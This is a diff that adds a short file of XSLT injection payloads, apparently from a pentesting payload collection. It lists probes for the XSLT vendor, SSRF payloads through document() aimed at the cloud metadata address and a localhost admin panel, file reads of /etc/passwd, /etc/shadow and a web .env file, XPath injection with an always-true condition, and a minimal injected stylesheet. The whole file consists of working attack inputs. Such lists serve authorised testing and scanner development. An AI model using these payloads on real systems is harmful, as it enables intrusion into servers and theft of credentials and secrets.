@@ -1,0 +1,30 @@
+# ============================================================
+# XSLT Injection — Basic Payloads
+# ============================================================
+
+# ---- Detection ----
+<xsl:value-of select="system-property('xsl:vendor')"/>
+<xsl:value-of select="system-property('xsl:version')"/>
+<xsl:value-of select="system-property('xsl:vendor-url')"/>
+
+# ---- SSRF via document() ----
+<xsl:value-of select="document('http://169.254.169.254/latest/meta-data/')"/>
+<xsl:value-of select="document('http://127.0.0.1:8080/admin')"/>
+<xsl:value-of select="document('file:///etc/passwd')"/>
+
+# ---- File Read ----
+<xsl:value-of select="document('file:///etc/passwd')"/>
+<xsl:value-of select="document('file:///etc/shadow')"/>
+<xsl:value-of select="document('file:///var/www/html/.env')"/>
+
+# ---- XPath Injection via XSLT ----
+<xsl:value-of select="//user[name='INJECT']"/>
+<xsl:value-of select="//user[name='' or '1'='1']"/>
+
+# ---- Template Injection ----
+<?xml version="1.0" encoding="UTF-8"?>
+<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
+<xsl:template match="/">
+  <xsl:value-of select="system-property('xsl:vendor')"/>
+</xsl:template>
+</xsl:stylesheet>
